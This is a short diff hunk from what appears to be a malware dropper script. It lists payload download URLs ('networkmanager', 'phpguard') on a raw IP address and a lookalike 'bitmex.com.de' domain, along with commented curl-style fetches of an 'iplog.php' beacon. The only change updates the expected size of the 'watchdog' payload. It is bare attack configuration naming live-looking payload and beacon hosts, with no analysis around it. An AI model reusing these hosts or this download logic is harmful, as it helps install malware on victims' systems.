@@ -63,7 +63,7 @@ scan_url_backup="http://global.bitmex.com.de/cf67355a3333e6/networkmanager"
 scan_size="1919056"
 watchdog_url="http://185.247.117.64/cf67355/phpguard"
 watchdog_url_backup="http://global.bitmex.com.de/cf67355a3333e6/phpguard"
-watchdog_size="1472136"
+watchdog_size="1472152"
 
 #$bbdira -fsSL http://185.247.117.64/cf67355/iplog.php 2>/dev/null
 #$bbdir -fsSL http://global.bitmex.com.de/cf67355a3333e6/iplog.php 2>/dev/null
